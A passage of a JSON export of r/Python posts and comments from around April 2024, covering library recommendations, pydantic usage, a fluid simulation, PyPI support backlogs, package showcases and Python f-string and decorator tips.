            "content": "using coding https://github.com/dropbox/pyxl/tree/py3 using context https://github.com/Knio/dominate using functions https://github.com/Hrabal/TemPy using operators https://github.com/mdamien/lys and many more",
            "replies": [
                {
                    "author": "TheRealMrMatt",
                    "score": "1",
                    "content": "Thank for the response. Do you know of any libraries that \"transpile\" like jsx or templ?"
                }
            ]
        },
        {
            "author": "AndydeCleyre",
            "score": "1",
            "content": "I may not understand the requirements, or have used it from Python, but I enjoy using wheezy.template templates and the command line interface."
        }
    ]
},
{
    "post_author": "yinshangyi",
    "post_id": "1c9m0e6",
    "post_score": "2",
    "post_time": "Sunday, April 21, 2024 at 7:25:08 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Returns Python library for FP",
    "media": [
        "https://github.com/Effect-TS/effect",
        "https://github.com/dry-python/returns"
    ],
    "post_content": "Hello!\nI work in big data space (data engineering), I mainly used Java, Scala and Python.\nI have been learning functional programming in greater depth and I found this Python library which seems pretty cool.\nhttps://github.com/dry-python/returns\nI've used it at work for implementing an Either based error handling.\nIt seems a great library.\nAny of you have used it?\nAny thoughts?\nFor sure, I prefer doing FP in Scala but given the job market isn't too kind too Scala and FP languages in general. What are your thoughts to bring FP (at least parts of it) to the Python world?\nSome people in the TypeScript world seem to take that direction:\nhttps://github.com/Effect-TS/effect",
    "comments": []
},
{
    "post_author": "Vegetable_Study3730",
    "post_id": "1c70x8m",
    "post_score": "100",
    "post_time": "Thursday, April 18, 2024 at 2:26:10 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Open Sourcing a Python Project the Right Way in 2024",
    "media": [
        "https://jonathanadly.com/open-sourcing-a-python-project-the-right-way-in-2024"
    ],
    "post_content": "I recently open-sourced a package and the tooling was a bit of a struggle. I decided to write down the steps & all the tools needed to open-source a Python package in a scalable way that invite users and contributors.\nhttps://jonathanadly.com/open-sourcing-a-python-project-the-right-way-in-2024\nHappy to hear your feedback!",
    "comments": [
        {
            "author": "Cybasura",
            "score": "20",
            "content": "This is really nice, I use most of these steps for almost all my python repos, pyproject toml, README etc 1 suggestion, I think it would be nice to introduce the source layout as well (placing the package in the src directory), I personally like the source layout because its neater"
        },
        {
            "author": "crawl_dht",
            "score": "5",
            "content": "You forgot pre-commit hooks."
        },
        {
            "author": "ckoneru",
            "score": "2",
            "content": "Good right up. Thank you"
        },
        {
            "author": "Glass_Dingo_3984",
            "score": "1",
            "content": "Fantastic read, I enjoyed them"
        },
        {
            "author": "Glass_Dingo_3984",
            "score": "1",
            "content": "U must have use a turtle py because you haven't use the expenses much more uses of user"
        },
        {
            "author": "yellow_cmd",
            "score": "1",
            "content": "Good read , I really enjoyed it 😄"
        },
        {
            "author": "arden13",
            "score": "1",
            "content": "Why cookiecutter and not pyscaffold?"
        },
        {
            "author": "sonobanana33",
            "score": "-6",
            "content": ""
        }
    ]
},
{
    "post_author": "uh_sorry_i_dont_know",
    "post_id": "1c9h0mh",
    "post_score": "112",
    "post_time": "Sunday, April 21, 2024 at 3:45:27 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Should I use pydantic for all my classes?",
    "media": [],
    "post_content": "Pydantic makes your code safer by making it strongly typed. You can no longer input a wrongly typed argument without getting an error (if pydantic can't convert it). This is great but to me it seems that sometimes standard python classes still seem preferable.\nPerhaps it's because I'm not using it correctly but my code for a pydantic class is much longer then for a normal class. Especially if you are working with computed attributes. Then you have to start using special decorators and for every computed attribute you have to declare a function with \"def ...\" Instead of in an init function just being able to write attribute_3 = attribute 1 + attribute 2.\nSo I'm just wondering are you using pydantic for all your classes? And how do you handle computed fields in pydantic especially upon instantiation I find it hard to implement.",
    "comments": [
        {
            "author": "twitch_and_shock",
            "score": "202",
            "content": "No, I don't. I only use pydantic to validate user input, such as when building an web API. The user might send some json data, and I use a pydantic class to validate that the data received contains all the required arguments with the correct types. When coding things that are for my use or my colleagues use, I use type hints but not pydantic.",
            "replies": [
                {
                    "author": "divad1196",
                    "score": "48",
                    "content": "Agreed, type hints + mypy is enough and faster. I am still using pydantic instead of dataclass though when I just want a struct of data."
                }
            ]
        },
        {
            "author": "alexmojaki",
            "score": "111",
            "content": "No. I'm working at Pydantic, the company. Samuel Colvin is my boss. We're working on a commercial product that should go public soon. Many of the classes in our codebase are pydantic models, but most are not. There's more dataclasses than pydantic models, and there's also plain standard classes.",
            "replies": [
                {
                    "author": "LeatherDude",
                    "score": "23",
                    "content": "Out of curiosity, why would I use a dataclass over a pydantic class? Is there some overhead with pydantic you avoid by using a plain dataclass?"
                }
            ]
        },
        {
            "author": "ePaint",
            "score": "33",
            "content": "Pydantic for JSON data received from outside, dataclasses for everything else"
        },
        {
            "author": "FloxaY",
            "score": "47",
            "content": "Use it when you actually need to verify the data, \"wrongly typed argument\" sounds like something you can avoid and should be catched by a static type checker. Don't add unnecessary overhead and external dependecies to your project."
        },
        {
            "author": "SBennett13",
            "score": "19",
            "content": "I like msgspec for message deserialization and type validation. Most of the time Pydantic is overkill. Msgspec is fast and the Struct classes work well. I don’t do many web things, so it might not be as ideal for web validation."
        },
        {
            "author": "deep_mind_",
            "score": "17",
            "content": "No. Pydantic is for user input validation -- it's just needless overhead for internal classes."
        },
        {
            "author": "YnkDK",
            "score": "7",
            "content": "People say \"only for user input\". Does that mean: Web API input? Database reads? Responses from third party Web API? Messages from queues? File reads? What other cases do you call \"user input\"?"
        },
        {
            "author": "ArgetDota",
            "score": "24",
            "content": "No, you should use beartype (or other similar libraries) if you just want runtime type checking. They are especially built for this purpose, while pydantic is more data-oriented. https://github.com/beartype/beartype"
        }
    ]
},
{
    "post_author": "GregTJ",
    "post_id": "fkk7aa",
    "post_score": "1920",
    "post_time": "Wednesday, March 18, 2020 at 8:09:55 AM GMT+3",
    "flair_text": "Scientific Computing",
    "post_title": "Fluid simulation in Python",
    "media": [
        "https://external-preview.redd.it/JVR1nXqa7aqkpL39TSUjWxcZJ4P3n_r7vtGJOWULzt8.gif?width=640&crop=smart&format=png8&s=c9f8b6ffcfc0d6e10c28cfd72ce497faea957f0b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "GregTJ",
            "score": "79",
            "content": "Repo: https://github.com/GregTJ/stable-fluids While an earlier version was based mostly on Nvidia's GPU gems article on fluid simulation, some valuable insights were gained through this blog post: http://www.philipzucker.com/annihilating-my-friend-will-with-a-python-fluid-simulation-like-the-cur-he-is/ I hope to add surface tracking, multigrid solving, proper boundary conditions, and lagrangian (FLIP) solving soon.",
            "replies": [
                {
                    "author": "The_Regent",
                    "score": "56",
                    "content": "Hey hey! I wrote that post! I get a huge kick out of the fact it was helpful to someone, so thanks for letting me know! You did a really good job here. The code looks tight and the results look great. For others, i highly reccommend checking out Dan Piponi's talk https://www.youtube.com/watch?v=766obijdpuU really excellent, very approachable. Also Bridson's notes https://www.cs.ubc.ca/~rbridson/fluidsimulation/fluids_notes.pdf and textbook https://www.amazon.com/Simulation-Computer-Graphics-Robert-Bridson/dp/1568813260",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "9",
                            "content": "Thanks for the great blog post, I wouldn't have gotten far without it. Initially I was building fd matrices row by row, your post introduced me to the (much, much faster) kronsum way of constructing them."
                        }
                    ]
                },
                {
                    "author": "BovineLightning",
                    "score": "12",
                    "content": "Some other conditions thatd be cool would be different densities for the fluids which interact and 3D modelling simulations Not sure if you’ve heard of Two Minute Papers but he does some amazing videos in fluid modelling and covering cutting research papers (also has been doing a lot of AI/ML lately)",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "2",
                            "content": "Late reply but just wanted to say I binge watched like 100 of their videos. Super cool channel."
                        }
                    ]
                },
                {
                    "author": "ad_abstract",
                    "score": "2",
                    "content": "Have you tried replacing some of the numpy ops with jax?",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "1",
                            "content": "I haven't, would you recommend doing so?"
                        }
                    ]
                },
                {
                    "author": "akaCryptic",
                    "score": "1",
                    "content": "I got an idea for a musoc video. How would you go about modifying this so that after the colours blend in, an impressionist painting / image reveals?",
                    "replies": [
                        {
                            "author": "GregTJ",
                            "score": "2",
                            "content": "I would either use a video editor or mess around with pillow / PIL."
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "11",
            "content": "Wow, that's awesome. Some frames would look great printed and put on a wall. edit: Ah, I see you're also experimenting with generative art."
        },
        {
            "author": "narakputra",
            "score": "5",
            "content": "Amazing, please consider making a tutorial for this."
        },
        {
            "author": "NewCenturyNarratives",
            "score": "4",
            "content": "This is the sort of stuff that I'm interested in learning how to do with Python. There seems to be a community focus on stats, but I'm more interested in modeling using continuous mathematics. Is there a specific place where I should be looking for information and inspiration?"
        },
        {
            "author": "wingtales",
            "score": "4",
            "content": "The code is really gorgeous! Well-written stuff! Good job!"
        },
        {
            "author": "TechnoConserve",
            "score": "3",
            "content": "How long does it have to run to create that gif?"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Big whirls have little whirls, that feed on their velocity, And little whirls have lesser whirls and so on to viscosity!"
        },
        {
            "author": "snarfdog",
            "score": "2",
            "content": "I will never get tired of karman vortex streets"
        },
        {
            "author": "nota3lephant",
            "score": "2",
            "content": "This is what it looks like when the fire, water, earth, and wind nations are at peace."
        }
    ]
},
{
    "post_author": "Significant-Turn4107",
    "post_id": "1c7ftf6",
    "post_score": "13",
    "post_time": "Friday, April 19, 2024 at 12:54:10 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python Wrapper For Meta AI (Llama 3)",
    "media": [
        "https://www.meta.ai/",
        "https://github.com/Strvm/meta-ai-api"
    ],
    "post_content": "Here is just a small wrapper to interact with the new MetaAI chat bot assistant with Python (https://www.meta.ai/), which is running the newly release Llama 3 model.\nAnother nice thing is that its directly connected with Bing Search so you will be able to get the latest informations.\nhttps://github.com/Strvm/meta-ai-api",
    "comments": [
        {
            "author": "assasinine",
            "score": "4",
            "content": "Given Facebook’s history of attracting then extracting from developers by closing off their API’s, I’d be wary of putting too much energy into this.",
            "replies": [
                {
                    "author": "Significant-Turn4107",
                    "score": "1",
                    "content": "As long as they don’t require authentication to interact with their API, there should always be a way to connect to it. Its similar to other ChatGPT wrappers out there"
                }
            ]
        },
        {
            "author": "SanFranLocal",
            "score": "1",
            "content": "That’s cool. Thanks. You know what the rate limits are like?",
            "replies": [
                {
                    "author": "Significant-Turn4107",
                    "score": "2",
                    "content": "Hi, I haven't tried to stress test it yet. If I do see it becoming an issue I'll add an option to set proxies."
                }
            ]
        }
    ]
},
{
    "post_author": "nginx26",
    "post_id": "1c92iom",
    "post_score": "53",
    "post_time": "Sunday, April 21, 2024 at 1:34:57 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing Stockdex: A Superior Python Package for Real-Time Financial Data Retrieval",
    "media": [
        "https://github.com/ahnazary/stockdex#fundamental-data-from-yahoo-finance-api-fast-queries-through-yahoo-finance-api",
        "https://pypi.org/project/stockdex/",
        "https://github.com/ahnazary/stockdex#fundamental-data-from-yahoo-finance-api-fast-queries-through-yahoo-finance-api:~:text=Repository%20files%20navigation-,README,-Stockdex",
        "https://www.reddit.com/r/Python/comments/1ba3h4w/comment/kupgxnn/?context=3"
    ],
    "post_content": "Greetings!\nI've previously introduced my Python package in this post. Since then, I've significantly enhanced its performance and expanded its capabilities.\nWhat My Project Does\nA lightweight python package designed for the efficient retrieval of financial data from various sources like Yahoo Finance, Nasdaq, Digrin and JustETF websites (somewhat similar to yfinance). This tool provides functionality akin to yfinance but with broader data access.\nMain benefits of stockdex over yfinance\nFresh data: Yahoo Finance often delays updates to financial data by several days while Nasdaq and other sources typically update on the day reports are released. Stockdex enables access to this fresher data, such as quarterly earnings.\nBroader Data Sources: Unlike yfinance which relies solely on the Yahoo Finance API, Stockdex aggregates data from multiple platforms including Digrin, JustETF, Nasdaq, and Yahoo Finance. For specific examples of data retrieval, refer to this readme.\nAccess to Historical Data: Yahoo Finance limits access to the most recent five annual or four quarterly reports. Stockdex, however, taps into sources that maintain extensive historical archives not available through Yahoo Finance.\nTarget Audience\nThe package is targeted at people who are interested in financial analysis using python.\nExplore more:\nGithub Repo Link\nPypi link",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Thanks for your reply, I would definitely keep that in mind and add more support for other securities in next releases.",
            "replies": [
                {
                    "author": "nginx26",
                    "score": "3",
                    "content": "Thanks for your reply, I would definitely keep that in mind and add more support for other securities in next releases."
                }
            ]
        },
        {
            "author": "PatzEdi",
            "score": "3",
            "content": "Awesome!!! We need more tools like this, well done.",
            "replies": [
                {
                    "author": "nginx26",
                    "score": "2",
                    "content": "Thanks"
                }
            ]
        },
        {
            "author": "Madmacsorakaganks",
            "score": "3",
            "content": "At a quick glance it seems yahoo finance is the only source for price data, is this correct? Cool project it!",
            "replies": [
                {
                    "author": "nginx26",
                    "score": "2",
                    "content": "Yes it is, price data is fetched from yahoo finance API and is pretty fast compared to scraping price from web sources."
                }
            ]
        },
        {
            "author": "Doggo_9000",
            "score": "2",
            "content": "You might want to consider incorporating bond data like payment schedules, interest rate, discount, face value from the EDGAR website as well. Debt is a popular investment category."
        },
        {
            "author": "Embarrassed-Mix6420",
            "score": "2",
            "content": "It's not clear or easy at all to add another or change market data provider. This should be first most important feature because if for it to ever be usefuil for me - I need to know how to adapt to the market signals I personally need - less is more"
        },
        {
            "author": "kdas22",
            "score": "1",
            "content": "Hi, Great work! does this work for Indian stocks? also, are you aware of Python libraries to pull data for Indian stocks?"
        },
        {
            "author": "geepytee",
            "score": "1",
            "content": "Cool! Recently ran into the limitations of yfinance and was looking for an alternative. It looks interesting, just installed. I wish docs were better, not clear how to gets thinks like shares outstanding, EPS, P/E, etc. EDIT: OP, your lib has a lot of the same limitations as yfinance regarding quarterly financials (can only get 5 Q's), gotta say I'm dissapointed",
            "replies": [
                {
                    "author": "nginx26",
                    "score": "1",
                    "content": "Hey, thansk for ur comment. I have recently released a new version (0.6.X) that solves some issues you mentioned. Also have to note that yahoo only provides data from last 5 quarters or last 4 years and there is no way to get older data from it, How ever with the new release of stockdex you can use functions to query data drom digrin or macrotrends websites which have historical data. Fell free to checkout repo`s readme for instructions and available functions.",
                    "replies": [
                        {
                            "author": "geepytee",
                            "score": "2",
                            "content": "Away from my desk but commenting to remember to check this tomorrow."
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "jgloewen",
    "post_id": "1ca69a5",
    "post_score": "2",
    "post_time": "Monday, April 22, 2024 at 12:18:54 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Intermediate Project: Python Plotly Data Visuals: Dropdowns and Range Sliders For User Interaction",
    "media": [
        "https://johnloewen.substack.com/p/python-plotly-combining-dropdowns-and-range-sliders-for-user-interaction-658dc6fd9c71"
    ],
    "post_content": "Interactive data visualization is a powerful tool that can significantly enhance the analysis and interpretation of complex datasets. With Python, the Plotly library offers various features that can be used to create interactive publication-quality graphs.\nThis project demonstrates how to use 2 of these awesome features:\nRange Slider\nDropdown Menu\nA good dataset is essential to demonstrate this style of interactivity. For this project, we will use the UN population projection data to sort and visualize by country for various age groups.\nFREE ARTICLE:\nhttps://johnloewen.substack.com/p/python-plotly-combining-dropdowns-and-range-sliders-for-user-interaction-658dc6fd9c71",
    "comments": []
},
{
    "post_author": "oli_k",
    "post_id": "1cakgj6",
    "post_score": "7",
    "post_time": "Monday, April 22, 2024 at 10:54:30 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "[tutorial] Data imputation on real-time data source",
    "media": [
        "https://bytewax.io/guides/handling-missing-values"
    ],
    "post_content": "Hi there,\nMy team at Bytewax and I have been working on a series of hands-on guides on streaming data and I am excited to share how one can handle missing values in real-time in Python.\nWhile some parts of the guide are simplified, for example, we use a random number generator as an input source, the algorithmic part is production-ready.\nWe are taking advantage of the Numpy library + stateful operators in Bytewax.\nOther input sources are available, too.\nhttps://bytewax.io/guides/handling-missing-values",
    "comments": []
},
{
    "post_author": "niklashnng",
    "post_id": "1c8ohrp",
    "post_score": "134",
    "post_time": "Saturday, April 20, 2024 at 3:12:18 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Python icon library with 5237 high-quality icons (Tabler Icons wrapper)",
    "media": [
        "https://github.com/niklashenning/pytablericons",
        "https://github.com/niklashenning/pytablericons/assets/58544929/e13fb020-4d5f-4e28-bd5f-0d5659bd6582"
    ],
    "post_content": "What My Project Does:\npytablericons is a Python wrapper for the tabler-icons project, which provides a set of 5237 free MIT-licensed high-quality SVG icons for web projects with each icon being designed on a 24x24 grid and a 2px stroke.\nIt allows you to load any of those SVG icons directly into a Pillow PNG Image in any size and color without losing quality and without having to download the icons manually or handling the SVG conversion yourself. For the outline icons, the stroke width is customizable as well. All of this is done in just a single line and since the icon is a Pillow Image, it can then be used easily with basically anything (e.g. PyQt5, PyQt6, PySide2, PySide6, Tkinter, etc.)\nTarget Audience:\nThis is useful for any Python developer who is working on UI projects and wants to easily display modern icons in any size and color without losing quality and without having to download each icon manually.\nComparison: /\nLinks:\nPreview: https://github.com/niklashenning/pytablericons/assets/58544929/e13fb020-4d5f-4e28-bd5f-0d5659bd6582\nGitHub: https://github.com/niklashenning/pytablericons",
    "comments": [
        {
            "author": "vexstream",
            "score": "20",
            "content": "Some thoughts- using pygame is an interesting way to do this. Wouldn't have thought of that for sure. That said, exposing a generic interface to make icons out of arbitrary svgs rather than limiting it to this set would be broadly more useful. Somewhat surprisingly to me, libcairo-implementing python libs don't have a direct svg-to-image call so that's a useful niche. I'd also encourage using pathlib/os.path to construct the path instead of string concat- it's probably harmless, but best not to leave holes open. Also, \"without losing quality\" is impossible- you're going to lose quality when converting from svg.",
            "replies": [
                {
                    "author": "niklashnng",
                    "score": "9",
                    "content": "Thanks for taking the time to share your thoughts. A generic interface to make icons out of arbitrary svgs is a really interesting idea, I might look into that. I agree with your point on not using string concatenation when constructing the path, I will definitely use os.path from now on. And looking at it now, I see that the \"without losing quality\" part is wrong and not the right way of saying what I meant to say."
                }
            ]
        },
        {
            "author": "mon_key_house",
            "score": "5",
            "content": "This is great. Aside from being directly usable from python, I've been looking for something like this but never found them. Thanks!",
            "replies": [
                {
                    "author": "niklashnng",
                    "score": "3",
                    "content": "I was also looking for something like this for some time and I was pretty surprised that there wasn't really anything like this out there already (at least as far as I know). Glad it's useful!"
                }
            ]
        },
        {
            "author": "Embarrassed-Mix6420",
            "score": "0",
            "content": "Why would you mention different versions of PyQt and PySide? Here is foundational thing to consider - how does it relate to the Material design already available in frameworks like the above mentioned - https://qt-material.readthedocs.io/en/latest/index.html https://kivymd.readthedocs.io/",
            "replies": [
                {
                    "author": "niklashnng",
                    "score": "3",
                    "content": "I don't understand why you have a problem with me mentioning different versions. I just stated that the project is easily usable with all of those versions, which is something people might ask themselves when looking at a project. Qt 5, for example, has reached end-of-life and support has been dropped by Pillow>=10.0.0 so certain Pillow methods that come in handy when using the icons with PyQt6 just don't work anymore for PyQt5, but as shown in the example code, it's still easy, although a bit different, to use the icons with PyQt5. And by the way, even the first link you posted mentions the different versions of PyQt and PySide in the very first sentence. And as far as your other point goes, I think you're comparing apples and oranges here. My project simply provides simple access to a large number of high-quality icons with a single import (just like basically any icon pack for web applications), while the links that you posted seem to be stylesheets and collections of widgets. On the first link, I couldn't even find anything about icons, and on the second link, there seem to also be widgets with icons, but what does that have to do with my project? pytablericons is something people can use when they want to add icons to their buttons, for example, and don't want to have to search for them and download them manually and in the right size and color every time. The project from your second link literally says ,\"The project's goal is to approximate Google's Material Design spec as close as possible\". How is that helpful for people who just want to easily add icons to their program without completely changing the look of their UI or learning a completely new library that, from the looks of the documentation, doesn't even have anything to do with PyQt."
                }
            ]
        }
    ]
},
{
    "post_author": "baekalfen",
    "post_id": "1c6y1pi",
    "post_score": "134",
    "post_time": "Thursday, April 18, 2024 at 11:13:39 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Has PyPI ceased all support?",
    "media": [
        "https://github.com/baekalfen/pyboy",
        "https://github.com/pypi/support/issues/3757"
    ],
    "post_content": "Does anyone know what’s going on behind the scenes of PyPI (who maintains `pip install`)? It seems like they’ve stopped processing support tickets over a month ago.\nI’ve hit the data limit for my package [PyBoy](https://github.com/baekalfen/pyboy), and I immediately posted a ticket to get the limit increased (as others have successfully done). But after more than a month, and several attempts at contacting the support team, I’ve heard nothing back, and I’ve run out of options.\nDoes anyone know what’s happening, or how to get a comment from PyPI?\nMy ticket is this one: https://github.com/pypi/support/issues/3757",
    "comments": [
        {
            "author": "monorepo",
            "score": "138",
            "content": "They have a backlog and are hiring people to fill currently. You could expect some responses in ~a month or two when they hire and onboard new hires. They have an email I think admin@pypi.org? It has it on the core website.",
            "replies": [
                {
                    "author": "baekalfen",
                    "score": "24",
                    "content": "The frustrating part for me is the lack of communication. I saw the latest tickets of this type were closed within a day of posting. And then nothing since. I'll give it a few more days since I just tagged someone in the ticket and tried reaching out on Discord. Then I'll see if I need to send an email too.",
                    "replies": [
                        {
                            "author": "monorepo",
                            "score": "11",
                            "content": "Yeah understandable! I actually asked about PyPI organizations recently and it came down to needing more staff to process the massive amounts of stuff they handle."
                        },
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "I'm allowed to criticize the process even though no money changed hands. I'd assume people have an expectation about PyBoy too.",
                            "replies": [
                                {
                                    "author": "baekalfen",
                                    "score": "23",
                                    "content": "I'm allowed to criticize the process even though no money changed hands. I'd assume people have an expectation about PyBoy too."
                                },
                                {
                                    "author": "PaintItPurple",
                                    "score": "4",
                                    "content": "If you don't like their complaint, you should ask for your money back."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ShakataGaNai",
            "score": "29",
            "content": "Perhaps update your documentation to install directly from github, at least in the mean time? ex: pip install git+https://github.com/Baekalfen/PyBoy.git@v2.0.2 Then they can take as long as they'd like to get back to you and it doesn't change that much. You can even put that exact same value in a requirements.txt and it works just the same."
        },
        {
            "author": "ManyInterests",
            "score": "40",
            "content": "Thanks for creating and maintaining PyBoy. It's a really cool project. I know someone who is interviewing for a PyPI support role with PSF, so my limited insight there is that they appear to be actively hiring to improve this situation. It looks like you were able to get a release out a few moments ago, so hopefully you've got some help on this!",
            "replies": [
                {
                    "author": "baekalfen",
                    "score": "13",
                    "content": "Thank you :) I hope it gets better soon. I had to go back and delete old releases to get enough quota back to do a release, which really sucks. And I'm running out of options fast."
                }
            ]
        },
        {
            "author": "wildpantz",
            "score": "15",
            "content": "Did I watch your video about training AI to play pokemon gen1? No matter, I love your project!",
            "replies": [
                {
                    "author": "baekalfen",
                    "score": "9",
                    "content": "That would have been u/Pwhids. But you're right that PyBoy was the backend :)"
                }
            ]
        },
        {
            "author": "ThreeChonkyCats",
            "score": "78",
            "content": "MAYBE if devs tossed them a bone every now and again, they'd have more people and more.... everything.... DONATE!",
            "replies": [
                {
                    "author": "baekalfen",
                    "score": "54",
                    "content": "I'm with you. But at this scale, we need to get large corporations to sponsor (i.e. Microsoft, Google, Amazon, Facebook). But I'm not sure if this a financial issue or just distribution. inb4 someone downvotes me: I work with open-source software as my full-time job."
                }
            ]
        },
        {
            "author": "not_sane",
            "score": "7",
            "content": "You can also host the files on GitHub (releases) and download them on the fly. At least that is what I did."
        }
    ]
},
{
    "post_author": "flaviaouyang",
    "post_id": "1caojbn",
    "post_score": "3",
    "post_time": "Tuesday, April 23, 2024 at 1:45:02 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Molly - a data quality monitoring library specifically designed for time series data",
    "media": [
        "https://github.com/flaviaouyang/molly"
    ],
    "post_content": "What My Project Does\nMolly is designed to monitor time series data in a SQL database such as MySQL or PostgreSQL.\nCurrently supported data quality feature:\n- staleness: when the data was last updated\n- completeness: whether any data is missing in a given date range\nCurrently support messaging service:\n- Slack Web API\nCurrently support scheduling service:\n- Apache Airflow\n- crontab\nTarget Audience\npeople in need of a plug-n-play dq monitoring service\nComparison\nIt's open source. It's free. It's written in pure python. And it's made for modern data stack so you can try it out with minimum effort.\nI'd appreciate it if you could check it out on GitHub. All feedback and/or contributions are welcomed!\nGitHub: https://github.com/flaviaouyang/molly",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        }
    ]
},
{
    "post_author": "RRTheGuy",
    "post_id": "1c9naa6",
    "post_score": "0",
    "post_time": "Sunday, April 21, 2024 at 8:20:13 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "A word search game generator",
    "media": [
        "https://github.com/RadoTheProgrammer/motsmeles/"
    ],
    "post_content": "https://github.com/RadoTheProgrammer/motsmeles/\nWhat my project does\nIt generate word search games with custom words, dimensions.\nTarget audience\nFor people who want to get fun with some word searching\nComparison\nThis is a python library, it's open source, and you can use it in a python code, or with the command-line.\nAlso, you have freedom if you want to have diagonal or reversed words.",
    "comments": [
        {
            "author": "remram",
            "score": "1",
            "content": "I don't know what's going on with your Git submodules but they aren't right.",
            "replies": [
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "it's fixed"
                }
            ]
        }
    ]
},
{
    "post_author": "JCx64",
    "post_id": "1c97glg",
    "post_score": "365",
    "post_time": "Sunday, April 21, 2024 at 5:44:28 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "My latest TILs about Python",
    "media": [
        "https://jcarlosroldan.com/post/329"
    ],
    "post_content": "After 10+ years working with it, I keep discovering new features. This is a list of the most recent ones: https://jcarlosroldan.com/post/329",
    "comments": [
        {
            "author": "KingsmanVince",
            "score": "176",
            "content": "With f-strings you can use the = modifier for including the code of the variable interpolation Nice, now I can debug with print even more efficient",
            "replies": [
                {
                    "author": "4sent4",
                    "score": "68",
                    "content": "A neat thing about this one - it keeps spaces around the = >>> a = 3 >>> f'{a=}' 'a=3' >>> f'{a = }' 'a = 3'"
                },
                {
                    "author": "Snoo35017",
                    "score": "55",
                    "content": "Even better imo is =!r. Causes it to print the repr value, which I find more useful when debugging.",
                    "replies": [
                        {
                            "author": "ogrinfo",
                            "score": "18",
                            "content": "Yep, just because it looks like a string when you print it, doesn't mean it is a string. That kind of stuff has caught me out so many times."
                        },
                        {
                            "author": "ExoticMandibles",
                            "score": "13",
                            "content": "When you use =, it automatically switches to repr formatting. You don't need to add !r to the end.",
                            "replies": [
                                {
                                    "author": "Snoo35017",
                                    "score": "2",
                                    "content": "TIL! I wonder why I started adding the !r then, I remember for some reason it would print the string value, but I might be imagining it."
                                },
                                {
                                    "author": "jarethholt",
                                    "score": "1",
                                    "content": "Does it? I remember you can use !r and !s for repr and string, but I don't remember offhand which is default"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "jmacey",
            "score": "28",
            "content": "The one that took me ages to find out (i.e. > 2 mins) was how to print out a { when using an f-string, tried \\{ but didn't work, eventually found out you needed to double them up! {{"
        },
        {
            "author": "pazqo",
            "score": "41",
            "content": "sum is actually a reduce, so you can use it for every thing that has a + defined, e.g. also lists (concat), you need to set [] or any other list as a starting point.",
            "replies": [
                {
                    "author": "naclmolecule",
                    "score": "21",
                    "content": "For lists, this is quadratic behavior. Recommend instead list(chain(whatever you were summing))."
                }
            ]
        },
        {
            "author": "denehoffman",
            "score": "18",
            "content": "Here’s one of my favorites: from pathlib import Path p = Path(“path/to/file.txt”) text = p.read_text() # or p.write_text(“some content”) # instead of with open(p) as f: text = f.read() # or with open(p, “w”) as f: f.write(“some content”) Downside, you have to import pathlib, upside, that’s already in the standard library, Path gives you a ton of path-related tools to play with, no extra indented blocks throwing off the flow of your code and no worrying about which mode to use. If you need to append, just read, append, and write (yes this is less efficient for large files but it’s fine for the large majority of use cases)"
        },
        {
            "author": "andrewowenmartin",
            "score": "50",
            "content": "Defining decorators as classes looks nicer than the higher-order functions you create otherwise. Especially if you want to accept parameters. I wonder if there's any drawback. The functional way uses functools.wraps, does anyone know if we can use that here, or perhaps it's not needed?",
            "replies": [
                {
                    "author": "Rawing7",
                    "score": "27",
                    "content": "The drawback is that the decorator won't work on methods. It breaks the implicit passing of self."
                }
            ]
        },
        {
            "author": "apt_at_it",
            "score": "40",
            "content": "Every single one of these is one I learn, then immediately forget, then learn about again a year or so later. Some of these neat \"quirks\" of languages seem so useful when I see them but then never actually use them 🤷"
        },
        {
            "author": "Green0Photon",
            "score": "10",
            "content": "Fuck, it's so useful to use classes to define decorators. Lets you store and access the underlying function. I wish I knew about this.",
            "replies": [
                {
                    "author": "divad1196",
                    "score": "14",
                    "content": "You can do that with closures too, which is the usual way of doing a decorator."
                }
            ]
        },
        {
            "author": "ycy_tai",
            "score": "7",
            "content": "Good one for class decorator."
        },
        {
            "author": "Kiuhnm",
            "score": "6",
            "content": "I didn't know about f\"{a=}\". That's useful. To reciprocate, let me point out that with open('test.txt') as f: print(f.read()) is problematic because it doesn't specify an encoding. Here's the correct version: with open('test.txt', encoding='utf-8') as f: print(f.read()) I recommend Pylint for these things. As for the mode defaulting to \"r\", well, it's impossible to miss since I see the signature every time I use open. I still prefer to be explicit, though. I also noticed you don't use type hints at all. I hope you do use type hints in real projects as they help a lot. They confuse until they help as reading them becomes second nature after a while."
        },
        {
            "author": "Jean-Porte",
            "score": "4",
            "content": "that \"base\" is confusing, I though it would be base 20. sum([1,2,3])+20 is just better",
            "replies": [
                {
                    "author": "andrewowenmartin",
                    "score": "5",
                    "content": "I think it's most useful when you're adding together a list of instances that have an __add__ method, but can't be added to 0. E.g. if you have a class called Game and you can do game_a + game_b but can't do game_a + 0 you can do sum(game_list, Game()). As this makes the first sum game_list[0] + Game(), instead of game_list[0] + 0. This assumes that Game() makes a decent \"starting place\" for the summations, of course."
                }
            ]
        },
        {
            "author": "sulfurmexo",
            "score": "2",
            "content": "the website seems down?",
            "replies": [
                {
                    "author": "SwordInStone",
                    "score": "2",
                    "content": "yeah, it's a bummer. I really want to read it after reading the comments"
                }
            ]
        },
        {
